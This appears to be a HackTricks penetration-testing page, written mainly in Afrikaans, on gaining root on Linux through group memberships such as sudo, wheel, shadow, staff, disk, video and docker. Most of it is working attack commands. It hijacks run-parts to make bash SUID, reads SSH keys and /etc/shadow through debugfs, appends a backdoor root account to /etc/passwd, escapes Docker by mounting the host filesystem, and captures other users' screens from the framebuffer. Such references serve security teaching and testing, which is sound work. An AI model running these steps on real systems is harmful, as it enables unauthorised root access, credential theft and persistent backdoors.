# Interessante Groepe - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Admin-groepe

### **PE - Method 1**

**Soms**, **by verstek (of omdat sekere sagteware dit benodig)** kan jy binne die **/etc/sudoers**-lêer sommige van hierdie lyne vind:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Dit beteken dat **enige gebruiker wat aan die groep sudo of admin behoort, enigiets as sudo kan uitvoer**.

As dit die geval is, kan jy **om root te word eenvoudig die volgende uitvoer**:
```
sudo su
```
### PE - Method 2

Vind alle suid-binêre lêers en kyk of die binêre lêer **Pkexec** daar is:
```bash
find / -perm -4000 2>/dev/null
```
As jy vind dat die binary **pkexec ’n SUID-binary is** en jy aan **sudo** of **admin** behoort, kan jy waarskynlik binaries as sudo uitvoer deur `pkexec` te gebruik.\
Dit is omdat dit gewoonlik die groepe binne die **polkit-beleid** is. Hierdie beleid identifiseer basies watter groepe `pkexec` kan gebruik. Kontroleer dit met:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Daar sal jy vind watter groepe toegelaat word om **pkexec** uit te voer en **by verstek** verskyn die groepe **sudo** en **admin** in sommige Linux-distros.

Om **root te word, kan jy uitvoer**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
As jy probeer om **pkexec** uit te voer en jy hierdie **fout** kry:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Dit is nie omdat jy nie permissions het nie, maar omdat jy nie sonder ’n GUI gekoppel is nie**. En daar is ’n workaround vir hierdie probleem hier: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Jy benodig **2 verskillende ssh sessions**:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Wheel Group

**Soms**, **by verstek** binne die **/etc/sudoers**-lêer kan jy hierdie reël vind:
```
%wheel	ALL=(ALL:ALL) ALL
```
Dit beteken dat **enige gebruiker wat aan die groep wheel behoort, enigiets as sudo kan uitvoer**.

As dit die geval is, kan jy **om root te word eenvoudig die volgende uitvoer**:
```
sudo su
```
## Shadow-groep

Users from the **group shadow** can **read** the **/etc/shadow** file:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
So, lees die lêer en probeer om **crack some hashes**.

Vinnige nuanse oor die lock-state wanneer hashes getriage word:
- Entries met `!` of `*` is oor die algemeen nie-interaktief vir password logins.
- `!hash` beteken gewoonlik dat ’n password gestel en daarna gelock is.
- `*` beteken gewoonlik dat geen geldige password hash ooit gestel is nie.
Dit is nuttig vir account classification, selfs wanneer direkte login geblokkeer word.

## Staff Group

**staff**: Laat gebruikers toe om plaaslike modifications aan die system (`/usr/local`) te maak sonder root privileges (let daarop dat executables in `/usr/local/bin` in die PATH variable van enige gebruiker is, en hulle moontlik die executables in `/bin` en `/usr/bin` met dieselfde naam kan "override"). Vergelyk dit met group "adm", wat meer met monitoring/security verband hou. [\[source\]](https://wiki.debian.org/SystemGroups)

In debian distributions wys die `$PATH` variable dat `/usr/local/` met die hoogste priority uitgevoer sal word, ongeag of jy ’n privileged user is of nie.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
As ons sommige programme in `/usr/local` kan kaap, kan ons maklik root-toegang verkry.

Om die `run-parts`-program te kaap, is ’n maklike manier om root-toegang te verkry, omdat die meeste programme iets soos `run-parts` sal uitvoer (crontab, wanneer daar via SSH aangemeld word).
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
of wanneer 'n nuwe ssh-sessie aanmeld.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Disk Group

Hierdie privilege is amper **ekwivalent aan root access**, aangesien jy toegang tot al die data binne die masjien kan verkry.

Files:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Let daarop dat jy met debugfs ook **lêers kan skryf**. Byvoorbeeld, om `/tmp/asd1.txt` na `/tmp/asd2.txt` te kopieer, kan jy die volgende doen:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
As jy egter probeer om **lêers wat deur root besit word** te **skryf** (soos `/etc/shadow` of `/etc/passwd`), sal jy ’n "**Permission denied**"-fout kry.

## Video-groep

Deur die opdrag `w` te gebruik, kan jy uitvind **wie op die stelsel aangemeld is**, en dit sal ’n uitvoer soos die volgende een wys:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
Die **tty1** beteken dat die gebruiker **yossi fisies by ’n terminal aangemeld is** op die masjien.

Die **video group** het toegang om die skermuitset te sien. Basies kan jy die skerms monitor. Om dit te doen, moet jy die **huidige beeld op die skerm** as rou data bekom en die resolusie bepaal wat die skerm gebruik. Die skermdata kan in `/dev/fb0` gestoor word, en jy kan die resolusie van hierdie skerm in `/sys/class/graphics/fb0/virtual_size` vind.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Om die **raw image** te **open**, kan jy **GIMP** gebruik, die **`screen.raw`**-lêer kies en **Raw image data** as lêertipe kies:

![Disk Group - Video Group: Om die raw image te open, kan jy GIMP gebruik, die screen.raw-lêer kies en Raw image data as lêertipe kies](<../../../images/image (463).png>)

Verander dan die Width en Height na dié wat op die skerm gebruik word en toets verskillende Image Types (en kies die een wat die skerm die beste vertoon):

![Disk Group - Video Group: Verander dan die Width en Height na dié wat op die skerm gebruik word en toets verskillende Image Types (en kies die een wat die skerm die beste vertoon)](<../../../images/image (317).png>)

## Root Group

Dit lyk asof **lede van die root group** by verstek toegang kan hê om sommige **service**-konfigurasielêers, sommige **libraries**-lêers of **ander interessante dinge** te **modify**, wat gebruik kan word om privileges te eskaleer...

**Check watter lêers root-lede kan modify**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Group

Jy kan die **root-lêerstelsel van die gasheermasjien aan ’n instance se volume mount**, sodat die instance, wanneer dit begin, onmiddellik ’n `chroot` na daardie volume laai. Dit gee jou effektief root op die masjien.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Laastens, as jy nie van enige van die vorige voorstelle hou nie, of as hulle om een of ander rede nie werk nie (docker api firewall?), kan jy altyd probeer om **’n bevoorregte container te hardloop en daaruit te ontsnap**, soos hier verduidelik word:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

As jy skryftoestemmings op die docker socket het, lees [**hierdie plasing oor hoe om privileges te eskaleer deur die docker socket te misbruik**](../../1-linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**


{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}


{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Group


{{#ref}}
./
{{#endref}}

## Adm Group

Gewoonlik het **lede** van die **`adm`**-groep toestemmings om **log**-lêers binne _/var/log/_ te **lees**.\
Daarom, as jy ’n gebruiker binne hierdie groep gekompromitteer het, moet jy beslis **na die loglêers kyk**.

## Backup / Operator / lp / Mail groups

Hierdie groepe is dikwels **credential-discovery**-vektore eerder as direkte root-vektore:
- **backup**: kan argiewe met konfigurasies, sleutels, DB-dumps of tokens blootstel.
- **operator**: platform-spesifieke operasionele toegang wat sensitiewe runtime-data kan lek.
- **lp**: drukrye/spools kan dokumentinhoud bevat.
- **mail**: mail-spools kan reset-skakels, OTP’s en interne credentials blootstel.

Beskou lidmaatskap hiervan as ’n bevinding met hoëwaarde-data-blootstelling en pivot deur hergebruik van wagwoorde/tokens.

## Auth group

Binne OpenBSD kan die **auth**-groep gewoonlik in die vouers _**/etc/skey**_ en _**/var/db/yubikey**_ skryf indien hulle gebruik word.\
Hierdie toestemmings kan met die volgende exploit misbruik word om privileges na root te **eskaleer**: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

{{#include ../../../banners/hacktricks-training.md}}
